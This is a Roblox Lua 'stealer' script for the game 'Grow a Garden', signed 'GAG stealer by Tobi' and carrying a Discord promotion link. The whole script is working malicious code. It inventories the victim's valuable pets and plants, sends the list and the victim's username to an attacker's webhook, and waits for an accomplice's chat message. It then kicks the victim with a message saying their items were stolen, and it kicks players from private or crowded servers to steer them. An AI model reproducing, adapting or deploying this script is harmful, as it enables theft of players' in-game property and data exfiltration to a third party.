local request = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (http_request) or request
local HttpService = game:GetService("HttpService")

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}

if next(users) == nil or webhook == "" then
    plr:Kick("You didn't add any usernames or webhook")
    return
end

if game.PlaceId ~= 126884695634066 then
    plr:Kick("Game not supported. Please join a normal GAG server")
    return
end

if #Players:GetPlayers() >= 5 then
    plr:Kick("Server error. Please join a DIFFERENT server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:Kick("Server error. Please join a DIFFERENT server")
    return
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then weight = tonumber(weightMatch) or 0 end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highest = 0
    for _, item in ipairs(itemsToSend) do
        if item.Weight > highest then
            highest = item.Weight
        end
    end
    return highest
end

local function SendWebhook(title, fieldName, fieldValue)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = fieldName, value = fieldValue, inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()), inline = false}
    }

    local data = {
        ["content"] = ping == "Yes" and "@everyone" or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }

    print("[DEBUG] Sending webhook to: " .. webhook)

    local success, err = pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)

    if success then
        print("[DEBUG] Webhook sent successfully!")
    else
        warn("[DEBUG] Webhook failed: " .. tostring(err))
    end
end

-- Scan backpack
for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                local value = calcPetValue(v14)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    local logString = ""
    for _, item in ipairs(itemsToSend) do
        logString = logString .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end

    SendWebhook("📦 GAG Item Detected", "Item list:", logString)

    local function onPlayerChat(player)
        if table.find(users, player.Name) then
            player.Chatted:Connect(function()
                SendWebhook("🟢 GAG Execution Triggered", "Items sent:", logString)
                wait(1)
                plr:Kick("All your stuff just got stolen by Tobi's stealer!\nJoin discord.gg/GY2RVSEGDT")
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
    Players.PlayerAdded:Connect(onPlayerChat)
end
